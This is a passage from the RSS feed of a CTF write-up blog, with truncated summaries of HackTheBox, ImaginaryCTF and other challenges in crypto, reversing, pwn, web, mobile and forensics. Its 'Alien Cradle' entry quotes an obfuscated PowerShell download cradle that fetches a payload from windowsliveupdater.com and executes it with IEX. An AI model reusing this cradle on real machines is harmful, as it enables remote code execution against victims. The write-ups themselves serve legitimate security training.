from secret import FLAG from hashlib import sha512 import socketserver import signal from random import randint WELCOME = """ **************** Welcome to the Hash Game. **************** * * * Hash functions are really spooky. * * In this game you will have to face your fears. * * Can you find a colision in the updated sha512? * * * *********************************************************** "</description></item><item><title>Alien Cradle</title><link>https://7rocky.github.io/en/ctf/htb-challenges/forensics/alien-cradle/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/htb-challenges/forensics/alien-cradle/</guid><description>We are given a PowerShell script called cradle.ps1:
if([System.Security.Principal.WindowsIdentity]::GetCurrent().Name -ne 'secret_HQ\Arth'){exit};$w = New-Object net.webclient;$w.Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;$d = $w.DownloadString('http://windowsliveupdater.com/updates/33' + '96f3bf5a605cc4' + '1bd0d6e229148' + '2a5/2_34122.gzip.b64');$s = New-Object IO.MemoryStream(,[Convert]::FromBase64String($d));$f = 'H' + 'T' + 'B' + '{p0w3rs' + 'h3ll' + '_Cr4d' + 'l3s_c4n_g3t' + '_th' + '3_j0b_d' + '0n3}';IEX (New-Object IO.StreamReader(New-Object IO.Compression.GzipStream($s,[IO.Compression.CompressionMode]::Decompress))).ReadToEnd(); PowerShell deobfuscation It is a bit obfuscated, let&amp;rsquo;s format it a bit:
if ([System.Security.Principal.WindowsIdentity]::GetCurrent().Name -ne 'secret_HQ\Arth') { exit }; $w = New-Object net.</description></item><item><title>Alien Saboteaur</title><link>https://7rocky.github.io/en/ctf/htb-challenges/reversing/alien-saboteaur/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/htb-challenges/reversing/alien-saboteaur/</guid><description>We are given a binary file called vm and a program called bin:
$ file * bin: data vm: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=10fb238b19d3a82b46536b51e47396525086a09c, for GNU/Linux 3.2.0, not stripped Setup environment The binary needs a recent version of Glibc in order to run:
$ ./vm ./vm: /lib/x86_64-linux-gnu/libc.so.6: version `GLIBC_2.34' not found (required by ./vm) To solve this issue, we can run Ubuntu 22.</description></item><item><title>Alien Saboteaur</title><link>https://7rocky.github.io/en/ctf/other/htb-cyber-apocalypse/alien-saboteaur/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/other/htb-cyber-apocalypse/alien-saboteaur/</guid><description>We are given a binary file called vm and a program called bin:
$ file * bin: data vm: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=10fb238b19d3a82b46536b51e47396525086a09c, for GNU/Linux 3.2.0, not stripped Setup environment The binary needs a recent version of Glibc in order to run:
$ ./vm ./vm: /lib/x86_64-linux-gnu/libc.so.6: version `GLIBC_2.34' not found (required by ./vm) To solve this issue, we can run Ubuntu 22.</description></item><item><title>Almost SSTI</title><link>https://7rocky.github.io/en/ctf/imaginaryctf/almost-ssti/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/imaginaryctf/almost-ssti/</guid><description>We are given a website to analyze. The index file shows the server source code:
#!/usr/bin/env python3 from flask import Flask, render_template_string, request, Response app = Flask(__name__) @app.route('/') def index(): return Response(open(__file__).read(), mimetype='text/plain') @app.route('/ssti') def ssti(): query = request.args['query'] if len(query) &amp;gt; 2: return "Too long!" return render_template_string(query) app.run('0.0.0.0', 3002, debug=True) It is a website built with Flask, in Python. One interesting thing is that debug mode is enabled.
The challenge talks about SSTI (Server-Side Template Injection), but we can only enter a 2-byte payload.</description></item><item><title>Amidst Us</title><link>https://7rocky.github.io/en/ctf/htb-challenges/web/amidst-us/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/htb-challenges/web/amidst-us/</guid><description>We have the following website, that mimics the game Among Us:
There is a button to select a color with a color picker:
If we analyze the given source code, we have a Flask application (in Python). This is application/blueprints/routes.py:
from flask import Blueprint, request, render_template, abort from application.util import make_alpha web = Blueprint('web', __name__) api = Blueprint('api', __name__) @web.route('/') def index(): return render_template('index.html') @api.route('/alphafy', methods=['POST']) def alphafy(): if not request.</description></item><item><title>Anchored</title><link>https://7rocky.github.io/en/ctf/htb-challenges/mobile/anchored/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/htb-challenges/mobile/anchored/</guid><description>We are given an APK file (Anchored.apk) and a README.txt file:
1. Install this application in an API Level 29 or earlier (i.e. Android 10.0 (Google Play)). 1. Install this application in a non-rooted device (i.e. In Android Studio AVD Manager select an image that includes (Google Play)). Reverse engineering The first thing we can do is to decompile de APK file and read Java source code.
APK decompilation If we load the APK in www.</description></item><item><title>Ancient Encodings</title><link>https://7rocky.github.io/en/ctf/htb-challenges/crypto/ancient-encodings/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/htb-challenges/crypto/ancient-encodings/</guid><description>We are given the Python source code to encrypt the flag:
from Crypto.Util.number import bytes_to_long from base64 import b64encode from secret import FLAG def encode(message): return hex(bytes_to_long(b64encode(message))) def main(): encoded_flag = encode(FLAG) with open("output.txt", "w") as f: f.write(encoded_flag) if __name__ == "__main__": main() And we also have the output of the script:
0x53465243657a51784d56383361444e664d32356a4d475178626a6c664e44497a5832677a4d6a4e664e7a42664e5463306558303d Source code analysis The program takes the flag and uses encode:
def encode(message): return hex(bytes_to_long(b64encode(message))) As can be seen, the flag is converted to Base64 encoding, then to a decimal number and finally to hexadecimal format.</description></item><item><title>Android-in-the-middle</title><link>https://7rocky.github.io/en/ctf/htb-challenges/crypto/android-in-the-middle/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/htb-challenges/crypto/android-in-the-middle/</guid><description>We have the Python source code to launch a local instance for the challenge:
$ python3 source.py $ nc 127.0.0.1 1337 DEBUG MSG - Generating The Global DH Parameters DEBUG MSG - g = 2, p = 10177459997049772558637057109490700048394574760284564283959324525695097805837401714582821820424475480057537817583807249627119267268524840254542683041588432363128111683358536204391767254517057859973149680238170237977230020947732558089671785239121778309357814575486749623687357688511361367822815452806637006568922401890961240475060822815400430220536180181951862931844638638933951683988349468373510128406899660648258602475728913837826845743111489145006566908004165703542907243208106044538037004824530893555918497937074663828069774495573109072469750423175863678445547058247156187317168731446722852098571735569138516533993 DEBUG MSG - Calculation Complete DEBUG MSG - Generating The Public Key of CPU... DEBUG MSG - Calculation Complete DEBUG MSG - Public Key is: ??? Enter The Public Key of The Memory: Taking a look at the source code, we see that the program expects a number $M$ from us to generate a shared secret.</description></item><item><title>Anti Flag</title><link>https://7rocky.github.io/en/ctf/htb-challenges/reversing/anti-flag/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/htb-challenges/reversing/anti-flag/</guid><description>We have a binary called anti_flag:
$ file anti_flag anti_flag: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=b8de97bc12c627606510140e43fc13e2efffcee5, for GNU/Linux 3.2.0, stripped Decompilation If we open it in Ghidra, we will see this main function:
/* WARNING: Removing unreachable block (ram,0x00101525) */ undefined8 main(undefined8 param_1, undefined8 param_2, undefined8 param_3, undefined8 param_4, undefined8 param_5, undefined8 param_6) { size_t sVar1; long lVar2; sVar1 = strlen(&amp;amp;DAT_00102011); malloc(sVar1 &amp;lt;&amp;lt; 2); lVar2 = ptrace(PTRACE_TRACEME, 0, 1, 0, param_5, param_6, param_2); if (lVar2 == -1) { puts("</description></item><item><title>Antidote</title><link>https://7rocky.github.io/en/ctf/htb-challenges/pwn/antidote/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/htb-challenges/pwn/antidote/</guid><description>We are given an ARM 32-bit binary called antidote:
Arch: arm-32-little RELRO: No RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x8000) Reverse engineering We can use Ghidra to analyze the binary and look at the decompiled source code in C. This is main:
int main() { undefined data[64]; undefined message[152]; setvbuf(stdout, (char *) 0x0, 2, 0); memcpy(message, "Bzzzzzzz... Bzzzzzzzzzzzzzzz... Damn those bugs!\nCome on, hurry up analyzing that bug\'s DNA!</description></item><item><title>APKrypt</title><link>https://7rocky.github.io/en/ctf/htb-challenges/mobile/apkrypt/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/htb-challenges/mobile/apkrypt/</guid><description>We are given an APK file (APKrypt.apk). We need to find a VIP code inside the APK file. Hence, we will use d2j-dex2jar to get a JAR file:
$ d2j-dex2jar APKrypt.apk dex2jar APKrypt.apk -> ./APKrypt-dex2jar.jar Source code analysis Now we upload the JAR file into www.javadecompilers.com and select Jadx as decompiler.
The main file is at sources/com/example/apkrypt/MainActivity.java:
package com.example.apkrypt; import android.app.Activity; import android.os.Bundle; import android.util.Base64; import android.view.View; import android.widget.Button; import android.</description></item><item><title>arcsin1</title><link>https://7rocky.github.io/en/ctf/imaginaryctf/arcsin1/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/imaginaryctf/arcsin1/</guid><description>We are asked to compute -arcsin(-1) * 0.2 (in radians) and take the digits between positions 10000 and 10099 of the decimal part of the result.
First of all, let&amp;rsquo;s do the math:
$$ \sin{\left(\frac{-\pi}{2}\right)} = -1 \iff \arcsin{(-1)} = \frac{-\pi}{2} $$ Notice that the inverse sine function is bounded: $\frac{-\pi}{2} \leq \arcsin{x} \leq \frac{\pi}{2}$ for $x \in \mathbb{R}$. Therefore:
$$ -\arcsin{(-1)} \cdot 0.2 = - \left(\frac{-\pi}{2}\right) \cdot 0.2 = \frac{\pi}{10} $$ So we are asked for the 10000th-10099th digits of $\pi$.</description></item><item><title>Arranged</title><link>https://7rocky.github.io/en/ctf/other/htb-cyber-apocalypse/arranged/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/other/htb-cyber-apocalypse/arranged/</guid><description>We are given the SageMath source code to encrypt the flag:
from Crypto.Cipher import AES from Crypto.Util.Padding import pad from Crypto.Util.number import long_to_bytes from hashlib import sha256 from secret import FLAG, p, b, priv_a, priv_b F = GF(p) E = EllipticCurve(F, [726, b]) G = E(926644437000604217447316655857202297402572559368538978912888106419470011487878351667380679323664062362524967242819810112524880301882054682462685841995367, 4856802955780604241403155772782614224057462426619061437325274365157616489963087648882578621484232159439344263863246191729458550632500259702851115715803253) A = G * priv_a B = G * priv_b print(A) print(B) C = priv_a * B assert C == priv_b * A # now use it as shared secret secret = C[0] hash = sha256() hash.</description></item><item><title>Art</title><link>https://7rocky.github.io/en/ctf/htb-challenges/misc/art/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/htb-challenges/misc/art/</guid><description>We are given a PNG image called art.png:
$ file art.png art.png: PNG image data, 300 x 300, 8-bit/color RGBA, non-interlaced We might think that the flag is somehow encoded in the colors that appear in the image. Actually, after a bit of research, we can find out that there is an esoteric language called npiet that encodes text in images with colors:
The examples look similar to what we have, so let&amp;rsquo;s try it:</description></item><item><title>Artifact Of Dangerous Sighting</title><link>https://7rocky.github.io/en/ctf/htb-challenges/forensics/artifact-of-dangerous-sighting/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/htb-challenges/forensics/artifact-of-dangerous-sighting/</guid><description>We are given a Windows disk image inside a folder called HostEvidence_PANDORA:
$ file HostEvidence_PANDORA/2023-03-09T132449_PANDORA.vhdx HostEvidence_PANDORA/2023-03-09T132449_PANDORA.vhdx: Microsoft Disk Image eXtended, by .NET DiscUtils, sequence 0x8, NO Log Signature; region, 2 entries, id Metadata, at 0x200000, Required 1, id BAT, at 0x300000, Required 1 If we switch to a Windows machine and mount the disk image, we will have the following folders:
Analyzing the disk image Basically, it is the C:\ drive of a Windows machine.</description></item><item><title>Artifacts of Dangerous Sightings</title><link>https://7rocky.github.io/en/ctf/other/htb-cyber-apocalypse/artifacts-of-dangerous-sightings/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/other/htb-cyber-apocalypse/artifacts-of-dangerous-sightings/</guid><description>We are given a Windows disk image inside a folder called HostEvidence_PANDORA:
$ file HostEvidence_PANDORA/2023-03-09T132449_PANDORA.vhdx HostEvidence_PANDORA/2023-03-09T132449_PANDORA.vhdx: Microsoft Disk Image eXtended, by .NET DiscUtils, sequence 0x8, NO Log Signature; region, 2 entries, id Metadata, at 0x200000, Required 1, id BAT, at 0x300000, Required 1 If we switch to a Windows machine and mount the disk image, we will have the following folders:
Analyzing the disk image Basically, it is the C:\ drive of a Windows machine.</description></item><item><title>Auth-or-out</title><link>https://7rocky.github.io/en/ctf/htb-challenges/pwn/auth-or-out/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/htb-challenges/pwn/auth-or-out/</guid><description>We have a 64-bit binary called auth-or-out:
Arch: amd64-64-little RELRO: Full RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled If we execute it, we have a menu for a typical heap exploitation challenge:
$ ./auth-or-out *** Welcome to DZONERZY authors editor v0.11.2 *** 1 - Add Author 2 - Modify Author 3 - Print Author 4 - Delete Author 5 - Exit Choice: Reverse engineering Let&amp;rsquo;s use Ghidra to obtain decompiled source code in C.</description></item><item><title>Automation</title><link>https://7rocky.github.io/en/ctf/htb-challenges/forensics/automation/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/htb-challenges/forensics/automation/</guid><description>We are given a PCAP file with a lot of packets:
HTTP traffic If we filter by HTTP, we will see some requests and responses:
As can be seen, the victim is downloading an exe file. This time we won&amp;rsquo;t be analyzing the binary file. Notice that there is a suspicious request to /desktop.png. The response contains Base64-encoded data:
PowerShell analysis If we decode it, we will get a PowerShell script:</description></item><item><title>baby auth</title><link>https://7rocky.github.io/en/ctf/htb-challenges/web/baby-auth/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/htb-challenges/web/baby-auth/</guid><description>We are provided with this webpage:
First, we can register a new account (asdf as username):
And we are told that we are not admin. In fact, the authentication is handled with session cookies:
The session cookie looks encoded in Base64, so let&amp;rsquo;s try to decode it (beware of URL encoding):
$ echo eyJ1c2VybmFtZSI6ImFzZGYifQ== | base64 -d {"username":"asdf"} It shows our username, so maybe we can modify the cookie and get access as admin:</description></item><item><title>baby BoneChewerCon</title><link>https://7rocky.github.io/en/ctf/htb-challenges/web/baby-bonechewercon/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/htb-challenges/web/baby-bonechewercon/</guid><description>We are provided with this webpage:
At the bottom of the page we have a text input. Let&amp;rsquo;s enter something and submit.
It shows an error in the Laravel debugger (a PHP framework):
This is a bad practice and a security issue, since debuggers might contain sensitive information and most of them provide ways to execute code.
Flag Indeed, we can find the flag in an environment variable named APP_KEY:</description></item><item><title>baby breaking grad</title><link>https://7rocky.github.io/en/ctf/htb-challenges/web/baby-breaking-grad/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/htb-challenges/web/baby-breaking-grad/</guid><description>We are provided with this webpage:
Let&amp;rsquo;s click in the button:
Source code analysis Alright, since we are provided with source code, let&amp;rsquo;s take a look. It is a Node.js project using Express JS. This is index.js:
const express = require('express'); const app = express(); const bodyParser = require('body-parser'); const routes = require('./routes'); const path = require('path'); app.use(bodyParser.json()); app.set('views','./views'); app.use('/static', express.static(path.resolve('static'))); app.use(routes); app.all('*', (req, res) =&amp;gt; { return res.status(404).send('404 page not found'); }); app.</description></item><item><title>baby CachedView</title><link>https://7rocky.github.io/en/ctf/htb-challenges/web/baby-cachedview/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/htb-challenges/web/baby-cachedview/</guid><description>We have a Flask web application that allows us to render other websites inside it as an image:
Behind the hoods, the server is launching a Headless Chrome with selenium, accessing the site we provided and taking a screenshot to show it. Here is an example:
The objective is to reach the endpoint /flag:
@web.route('/flag') @is_from_localhost def flag(): return send_file('flag.png') However, it is protected by checking that the request is done from 127.</description></item><item><title>Baby Crypt</title><link>https://7rocky.github.io/en/ctf/htb-challenges/reversing/baby-crypt/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/htb-challenges/reversing/baby-crypt/</guid><description>We have a binary called baby_crypt:
$ file baby_crypt baby_crypt: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=24af7e68eab982022ea63c1828813c3bfa671b51, for GNU/Linux 3.2.0, not stripped If we open it in Ghidra, we will see this main function:
int main() { char *key; long in_FS_OFFSET; int i; undefined8 local_38; undefined8 local_30; undefined8 local_28; undefined2 local_20; long canary; canary = *(long *) (in_FS_OFFSET + 0x28); printf("Give me the key and I\'ll give you the flag: "</description></item><item><title>baby interdimensional internet</title><link>https://7rocky.github.io/en/ctf/htb-challenges/web/baby-interdimensional-internet/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/htb-challenges/web/baby-interdimensional-internet/</guid><description>We are provided with this webpage:
If we look into the HTML source code, we see /debug:
And there we can find the source code of the web application:
from flask import Flask, Response, request, render_template, request from random import choice, randint from string import lowercase from functools import wraps app = Flask(__name__) def calc(recipe): global garage garage = {} try: exec(recipe, garage) except: pass def GCR(func): # Great Calculator of the observable universe and it's infinite timelines @wraps(func) def federation(*args, **kwargs): ingredient = ''.</description></item><item><title>baby nginxatsu</title><link>https://7rocky.github.io/en/ctf/htb-challenges/web/baby-nginxatsu/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/htb-challenges/web/baby-nginxatsu/</guid><description>We are provided with this webpage:
After registering an account and logging in, we have this feature:
Basically, we can create nginx configuration files.
nginx exploitation Notice that the location field is /storage. Let&amp;rsquo;s create the default configuration and see what we have:
We have this configuration:
user www; pid /run/nginx.pid; error_log /dev/stderr info; events { worker_connections 1024; } http { server_tokens off; charset utf-8; keepalive_timeout 20s; sendfile on; tcp_nopush on; client_max_body_size 2M; include /etc/nginx/mime.</description></item><item><title>baby ninja jinja</title><link>https://7rocky.github.io/en/ctf/htb-challenges/web/baby-ninja-jinja/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/htb-challenges/web/baby-ninja-jinja/</guid><description>We are provided with this web page:
There is an HTML comment on the index.html that points to a debugging URL (/debug):
In this /debug endpoint, the source code is found:
$ curl 157.245.33.77:31650/debug from flask import Flask, session, render_template, request, Response, render_template_string, g import functools, sqlite3, os app = Flask(__name__) app.config['SECRET_KEY'] = os.urandom(120) acc_tmpl = '''{% extends 'index.html' %} {% block content %} &amp;lt;h3&amp;gt;baby_ninja joined, total number of rebels: reb_num&amp;lt;br&amp;gt; {% endblock %} ''' def get_db(): db = getattr(g, '_database', None) if db is None: db = g.</description></item><item><title>baby quick maffs</title><link>https://7rocky.github.io/en/ctf/htb-challenges/crypto/baby-quick-maffs/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/htb-challenges/crypto/baby-quick-maffs/</guid><description>We are given a Python script to encrypt the flag, and we are given the output.txt file:
#!/usr/bin/env python3 from secret import flag, p, q from Crypto.Util.number import bytes_to_long from random import randint def partition_message(m, N): m1 = randint(1, N) parts = [] remainder = 0 while sum(parts) &amp;lt; m: if sum(parts) + m1 &amp;lt; m: parts.append(m1) else: remainder = m - sum(parts) parts.append(m1 + remainder) return (parts, remainder) def encode(message, N): m = bytes_to_long(message) parts, remainder = partition_message(m, N) ciphers = [pow(c, 2, N) for c in parts] return (ciphers, remainder) N = p * q ciphers, remainder = encode(flag, N) with open("</description></item><item><title>Baby RE</title><link>https://7rocky.github.io/en/ctf/htb-challenges/reversing/baby-re/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/htb-challenges/reversing/baby-re/</guid><description>We have a binary called baby:
$ file baby baby: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=25adc53b89f781335a27bf1b81f5c4cb74581022, for GNU/Linux 3.2.0, not stripped If we run it, it asks for a key:
$ ./baby Insert key: We can introduce something and see that it is not correct:
$ ./baby Insert key: 1234 Try again later. We can make use of ltrace to see every call to external functions (functions that belong to a library like Glibc):</description></item><item><title>baby todo or not todo</title><link>https://7rocky.github.io/en/ctf/htb-challenges/web/baby-todo-or-not-todo/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/htb-challenges/web/baby-todo-or-not-todo/</guid><description>We are provided with this webpage:
Source code analysis We are also provided with the source code, which is a Flask application (Python). This is application/app.py:
from flask import Flask, session, g from flask.json import JSONEncoder from application.blueprints.routes import main, api from application.util import generate from application.database import get_db from application.models import todo import time class toJSON(JSONEncoder): def default(self, obj): if isinstance(obj, todo): return { 'id' : obj.id, 'name' : obj.</description></item><item><title>baby WAFfles order</title><link>https://7rocky.github.io/en/ctf/htb-challenges/web/baby-waffles-order/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/htb-challenges/web/baby-waffles-order/</guid><description>We are provided with this webpage:
Static code analysis We also have the PHP source code. This is index.php:
&amp;lt;?php spl_autoload_register(function ($name){ if (preg_match('/Controller$/', $name)) { $name = "controllers/${name}"; } include_once "${name}.php"; }); $router = new Router(); $router-&amp;gt;new('GET', '/', fn($router) =&amp;gt; $router-&amp;gt;view('menu')); $router-&amp;gt;new('POST', '/api/order', 'OrderController@order'); die($router-&amp;gt;match()); Here we only see two routes. The one that is most interesting is the one handled by OrderController.php:
&amp;lt;?php class OrderController { public function order($router) { $body = file_get_contents('php://input'); if ($_SERVER['HTTP_CONTENT_TYPE'] === 'application/json') { $order = json_decode($body); if (!</description></item><item><title>baby website rick</title><link>https://7rocky.github.io/en/ctf/htb-challenges/web/baby-website-rick/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/htb-challenges/web/baby-website-rick/</guid><description>We are provided with this webpage:
Analyzing the website This time, we don&amp;rsquo;t have any source code to analyze. However, the above image shows something suspicious:
&lt;__main__.anti_pickle_serum object at 0x7f0ed62d1810> This looks like a Python class:
$ python3 -q &amp;gt;&amp;gt;&amp;gt; class Test(): ... pass ... &amp;gt;&amp;gt;&amp;gt; Test() &amp;lt;__main__.Test object at 0x1007fbd30&amp;gt; Moreover, we have a cookie named plan_b:
This looks like a Base64-encoded string:
&amp;gt;&amp;gt;&amp;gt; from base64 import b64encode as b64e, b64decode as b64d &amp;gt;&amp;gt;&amp;gt; b64d('KGRwMApTJ3NlcnVtJwpwMQpjY29weV9yZWcKX3JlY29uc3RydWN0b3IKcDIKKGNfX21haW5fXwphbnRpX3BpY2tsZV9zZXJ1bQpwMwpjX19idWlsdGluX18Kb2JqZWN0CnA0Ck50cDUKUnA2CnMu') b"</description></item><item><title>baby-talk</title><link>https://7rocky.github.io/en/ctf/other/dicectf/baby-talk/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/other/dicectf/baby-talk/</guid><description>We are given a 64-bit binary called chall:
Arch: amd64-64-little RELRO: Full RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled The program gives us four options:
$ ./chall 1. str 2. tok 3. del 4. exit &amp;gt; Reverse engineering If we open the binary in Ghidra, we will see the following decompiled C code. The main function manages the options and calls the corresponding function:
int main() { ulong option; setbuf(stdout, NULL); do { while (true) { while (true) { print_menu(); printf("</description></item><item><title>babyreeee</title><link>https://7rocky.github.io/en/ctf/other/seetf/babyreeee/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/other/seetf/babyreeee/</guid><description>We are given a binary called chall:
$ file chall chall: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=151528987cd274999ec93665ef2d6a7678c5107b, for GNU/Linux 3.2.0, stripped When we execute, it asks for the flag:
$ ./chall Hello! Welcome to SEETF. Please enter the flag. SEE{asdf} Flag wrong. Try again. Let&amp;rsquo;s open the binary in Ghidra to analyze the decompiled C code. This is the main function. It is a bit overwhelming because there are a lot of assignments:</description></item><item><title>Bad JWT</title><link>https://7rocky.github.io/en/ctf/other/seccon-ctf/bad-jwt/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/other/seccon-ctf/bad-jwt/</guid><description>We are given the source code of a Node.js project. This is index.js:
const FLAG = process.env.FLAG ?? 'SECCON{dummy}'; const PORT = '3000';; const express = require('express'); const cookieParser = require('cookie-parser'); const jwt = require('./jwt'); const app = express(); app.use(express.urlencoded({ extended: false })); app.use(cookieParser()); const secret = require('crypto').randomBytes(32).toString('hex'); app.use((req, res, next) =&amp;gt; { try { const token = req.cookies.session; const payload = jwt.verify(token, secret); req.session = payload; } catch (e) { return res.</description></item><item><title>Bank-er-smith</title><link>https://7rocky.github.io/en/ctf/htb-challenges/crypto/bank-er-smith/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/htb-challenges/crypto/bank-er-smith/</guid><description>We got the Python source code of the server:
from Crypto.Util.number import getPrime, bytes_to_long, long_to_bytes, inverse, GCD from secret import FLAG, KEY WELCOME = """ ************** Welcome to the Gringatts Bank. ************** * * * Fortius Quo Fidelius * * * ************************************************************ """ class RSA(): def __init__(self, key_length): self.e = 0x10001 phi = 0 prime_length = key_length // 2 while GCD(self.e, phi) != 1: self.p, self.q = getPrime(prime_length), getPrime(prime_length) phi = (self.</description></item><item><title>Bank-er-smith</title><link>https://7rocky.github.io/en/ctf/other/htb-unictf/bank-er-smith/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/other/htb-unictf/bank-er-smith/</guid><description>We got the Python source code of the server:
from Crypto.Util.number import getPrime, bytes_to_long, long_to_bytes, inverse, GCD from secret import FLAG, KEY WELCOME = """ ************** Welcome to the Gringatts Bank. ************** * * * Fortius Quo Fidelius * * * ************************************************************ """ class RSA(): def __init__(self, key_length): self.e = 0x10001 phi = 0 prime_length = key_length // 2 while GCD(self.e, phi) != 1: self.p, self.q = getPrime(prime_length), getPrime(prime_length) phi = (self.</description></item><item><title>Base 2 2 the 6</title><link>https://7rocky.github.io/en/ctf/ctflearn/cryptography/base-2-2-the-6/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/ctflearn/cryptography/base-2-2-the-6/</guid><description>We are given this string:
Q1RGbGVhcm57RmxhZ2d5V2FnZ3lSYWdneX0K
Since it has numbers, lowercase letters and uppercase letters, it seems to be encoded in Base64.
Actually, the name of the challenge is &amp;ldquo;2 2 the 6&amp;rdquo; (&amp;ldquo;2 to the 6&amp;rdquo;), so $2^6 = 64$.
We can decode it using a shell:
$ echo Q1RGbGVhcm57RmxhZ2d5V2FnZ3lSYWdneX0K | base64 -d CTFlearn{FlaggyWaggyRaggy}</description></item><item><title>base64</title><link>https://7rocky.github.io/en/ctf/imaginaryctf/base64/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/imaginaryctf/base64/</guid><description>We are given this string:
aWN0ZntfX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX30= It looks like Base64-encoded data&amp;hellip; And the challenge is called &amp;ldquo;base64&amp;rdquo;, so everything is clear.
Flag This is the flag:
$ echo aWN0ZntfX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX30= | base64 -d ictf{___________________________________}</description></item><item><title>Bashic Ransomware</title><link>https://7rocky.github.io/en/ctf/other/htb-cyber-apocalypse/bashic-ransomware/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/other/htb-cyber-apocalypse/bashic-ransomware/</guid><description>We are given these files:
$ file * flag.txt.a59ap: GPG symmetrically encrypted data (AES256 cipher) forensics.mem: data linux-image-5.10.0-21.zip: Zip archive data, at least v2.0 to extract, compression method=deflate traffic.pcap: pcapng capture file - version 1.0 We can guess that we will need to analyze a compromised Linux machine because we are given a memory dump (forensics.mem) and a profile for volatility.
Network traffic analysis Let&amp;rsquo;s start using Wireshark to analyze the PCAP:</description></item><item><title>basic</title><link>https://7rocky.github.io/en/ctf/imaginaryctf/basic/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/imaginaryctf/basic/</guid><description>We are asked to represent 51 in base 12. This is simple:
